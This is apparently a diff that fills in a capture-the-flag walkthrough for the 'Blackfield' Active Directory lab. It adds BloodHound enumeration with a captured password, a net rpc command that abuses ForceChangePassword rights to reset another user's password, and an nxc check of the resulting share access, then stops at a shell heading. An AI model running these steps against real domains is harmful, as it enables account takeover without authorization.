@@ -171,27 +171,42 @@ Now we will confirm the credentials using NXC before moving on
 Now that we have valid credentials, we will use bloodhound-ce-py to enumerate the domain
 
 ```
-
+bloodhound-ce-python -c All -d BLACKFIELD.LOCAL -k --zip -u support -p '#00^BlackKnight' -ns 10.129.229.17
 ```
 
+Now the usual - Boot up bloodhound ----> Log In ----> Upload the zip ----> Profit?
 
+First thing to check is compromised assets, in this case `support@blackfield.local`, and we find that this account has `ForceChangePassword` rights on `Audit2020@blackfield.local` 
 
+![](../assets/images/Pasted%20image%2020260123190918.png)
 
-
-
-
+We can now use the misconfiguration to compromise another user.
 
 ---
 ### Exploitation
 
-**Step 1:** [Action taken]
+**Step 1:** Change user password
 ```bash
 # Commands
+❯ net rpc password "audit2020" "asdasd123@" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.LOCAL"
 ```
 
-**Step 2:** [Next action]
+**Step 2:** Validate changes
 ```bash
 # Commands
+❯ nxc smb 10.129.229.17 -u 'audit2020' -p 'asdasd123@' --shares
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:asdasd123@ 
+SMB         10.129.229.17   445    DC01             [*] Enumerated shares
+SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
+SMB         10.129.229.17   445    DC01             -----           -----------     ------
+SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.229.17   445    DC01             C$                              Default share
+SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
+SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.229.17   445    DC01             profiles$       READ            
+SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share 
 ```
 
 **Getting a shell:**
